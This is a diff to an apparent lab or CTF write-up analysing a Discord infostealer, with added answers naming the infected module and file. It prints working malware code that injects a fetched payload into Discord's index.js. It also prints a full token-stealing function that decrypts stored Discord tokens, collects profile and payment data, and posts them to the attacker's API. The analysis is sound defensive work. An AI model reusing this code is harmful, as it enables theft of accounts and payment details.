@@ -298,7 +298,7 @@ npm install sqlite3
 49. Afterwards, if the file is found then it collects all the data from the DB, then return it.
 
 
-> 13TH QUESTION --> ANS:
+> 13TH QUESTION --> ANS: `discord_desktop_core-1, index.js`
 
 ![image](https://github.com/user-attachments/assets/54ed6588-8c39-422f-b6d8-466d6ba9fdc3)
 
@@ -352,8 +352,20 @@ async function discordInjection() {
 };
 ```
 
-52. Based on the script above, at the beginning it loops through each standard installation directories for Discord (Discorc, Discord Canary, and Discord PTB).
+52. Based on the script above, at the beginning it loops through each standard installation directories for Discord (Discord, Discord Canary, and Discord PTB). Next, it check for subdirectories starting with `app-` which correspond to specific Discord versions, then constructs a path to the `discord_desktop_core-1` module folder, a common location for Discord's core functionality. 
+
+```js
+// Find Discord App Version
+if(!readdirSync(dir).filter((f => f?.startsWith('app-')))?.[0]) return;
+const path = join(dir, readdirSync(dir).filter((f => f.startsWith('app-')))?.[0], 'modules', 'discord_desktop_core-1');
+```
+
 53. Later on, it checks for existing installations, locates the `index.js` file in Discord's core module directory, then fetches a payload from a specified API to overwrite the file (injecting malicious code).
+
+```js
+// locate index.js file
+const discord_index = execSync('where /r . index.js', { cwd: path })?.toString()?.trim();
+```
 
 ```js
 const request = await fetch(options.api + 'injections', {
@@ -370,14 +382,159 @@ const data = await request.json();
 
 ```js
 writeFileSync(discord_index, data?.discord, {
-                flag: 'w'
-            });
+    flag: 'w'
+});
 
-            await kill(['discord', 'discordcanary', 'discorddevelopment', 'discordptb']);
-            exec(`${join(dir, 'Update.exe')} --processStart ${dir?.split(process.env.LOCALAPPDATA)?.[1]?.replace('\\', '')}.exe`, function(err) {
-                if(err) {};
-            });
+await kill(['discord', 'discordcanary', 'discorddevelopment', 'discordptb']);
+exec(`${join(dir, 'Update.exe')} --processStart ${dir?.split(process.env.LOCALAPPDATA)?.[1]?.replace('\\', '')}.exe`, function(err) {
+    if(err) {};
+});
 ```
+
+56. Nice! At this rate we know the first solution is to clean up the `discord_desktop_core-1` module's --> `index.js` source file.
+
+> getDiscordTokens()
+
+```js
+async function getDiscordTokens() {
+    const request = await fetch(options.api + 'paths', {
+        method: 'GET',
+        headers: {
+            'Content-Type': 'application/json',
+            'duvet_user': options.user_id
+        }
+    });
+    
+    const paths = await request.json();
+    const tokens_list = [];
+
+    for(const [key, value] of Object.entries(paths.discordTokens)) {
+        const path = value.replace('appdata', process.env.LOCALAPPDATA).replace('roaming', process.env.APPDATA);
+
+        if(existsSync(path) && existsSync(join(path, '..', '..', 'Local State'))) {
+            for(const file of readdirSync(path)) {
+                if(file?.endsWith('.ldb')  || file?.endsWith('.log')) {
+                    if(!existsSync(join(path, file))) return;
+
+                    const file_content = readFileSync(join(path, file), 'utf-8')
+                    .split('\n')?.map((x) => x?.trim());
+
+                    file_content?.forEach((line) => {
+                        const encrypted_tokens = line?.match(/dQw4w9WgXcQ:[^.*['(.*)'\].*$][^']*/gi);
+                        if(encrypted_tokens) {
+                            encrypted_tokens?.forEach(async(token) => {
+                                if(token?.endsWith('\\')) token = (token?.slice(0, -1).replace('\\', ''))?.slice(0, -1);
+                                const encrypted_key = Buffer.from(JSON.parse(readFileSync(join(path, '..', '..', 'Local State')))?.os_crypt?.encrypted_key, 'base64').slice(5);
+                                const decrypted_key = Dpapi?.unprotectData(Buffer.from(encrypted_key, 'utf-8'), null, 'CurrentUser');
+                                if(!decrypted_key) return;
+
+                                let decrypted_token;
+
+                                const encrypted = Buffer.from(token?.split(':')[1], 'base64');
+                                if(!encrypted) return;
+
+                                const start = encrypted?.slice(3, 15), 
+                                middle = encrypted?.slice(15, encrypted?.length - 16),
+                                end = encrypted?.slice(encrypted?.length - 16, encrypted?.length);
+                            
+                                if(decrypted_key.byteLength >= 64) return;
+
+                                if(start?.length !== 12) return;
+                                const cipher = createCipheriv('aes-256-gcm', decrypted_key, start)
+                                let encryptedData = cipher.update(middle, 'base64', 'utf-8');
+                                encryptedData += cipher.final('utf-8');
+
+                                decrypted_token = encryptedData;
+                                if(!tokens_list?.find((t) => t?.token === decrypted_token)) {
+                                    tokens_list.push({
+                                        token: decrypted_token,
+                                        found_in: key,
+                                        auth_tag_length: end.length,
+                                        crypto_iv: start?.length
+                                    });
+                                };
+                            });
+                        };
+                    });
+                };
+            };
+        } else if(existsSync(path)  && !existsSync(join(path, '..', '..', 'Local State'))) {
+            for(const file of readdirSync(path)) {
+                if(file?.endsWith('.ldb') || file?.endsWith('.log')) {
+                    const file_content = readFileSync(join(path, file), 'utf-8')?.split(/\r?\n/);
+                    file_content?.forEach((line) => {
+                        for(const regex of [new RegExp(/mfa\.[\w-]{84}/g), new RegExp(/[\w-][\w-][\w-]{24}\.[\w-]{6}\.[\w-]{26,110}/gm), new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g)]) {
+                            const matched_tokens = line?.match(regex);
+                            if(matched_tokens) {
+                                matched_tokens?.forEach(async(token) => {
+                                    if(!tokens_list?.find((t) => t?.token === token)) {
+                                        tokens_list?.push({
+                                            token: token,
+                                            found_in: key
+                                        });
+                                    };
+                                });
+                            };
+                        };
+                    });
+                };
+            };
+        } else {
+            continue;
+        };
+    };
+
+    const merge = (a, b, predicate = (a, b) => a === b) => {
+        const c = [...a];
+        b?.forEach((bItem) => (c?.some((cItem) => predicate(bItem, cItem)) ? null : c?.push(bItem)))
+        return c;
+    };
+
+    const firefox_tokens = await stealFirefoxTokens();
+
+    const valid_tokens = [];
+    for(const value of merge(tokens_list, firefox_tokens)) {
+        const token_data = await checkToken(value?.token);
+
+        if(token_data?.id) {
+            const user_data = await tokenRequests(value?.token, token_data?.id);
+            if(!valid_tokens.find((u) => u?.user?.data?.id === token_data.id)) {
+                valid_tokens.push({
+                    token: value?.token,
+                    found_at: value?.found_in,
+                    auth_tag_length: value?.auth_tag_length,
+                    crypto_iv: value?.crypto_iv,
+                    user: {
+                        data: token_data,
+                        profile: user_data?.profile,
+                        payment_sources: user_data?.payment_sources
+                    }
+                });
+            };
+        };
+    };
+    
+    if(valid_tokens?.length) {
+        fetch(options.api + 'valid-tokens', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                duvet_user: options?.user_id,
+                valid_tokens,
+                computer_name: userInfo()?.username
+            })
+        });
+    };
+};
+```
+
+57. In short, this function is used to extract and decrypt Discord authentication tokens from a system. It attempts to steal Discord auth tokens by fetching paths from an API and scanning the system for `.ldb` and `.log` files within the specified directories.
+58. This function also calls another function like **stealFirefoxTokens** to gather tokens from other sources and ensures all tokens are checked and merged into a single list before being sent to the threat actor.
+59. Long story short I did not find any Discord related function other than `discordInjection()` that infected a file. This conclude the module infected is `discord_desktop_core-1` and the file name infected is `index.js`.
+60. Awesome! We have investigated the case!
+
 
 ## IMPORTANT LINK(S):
 
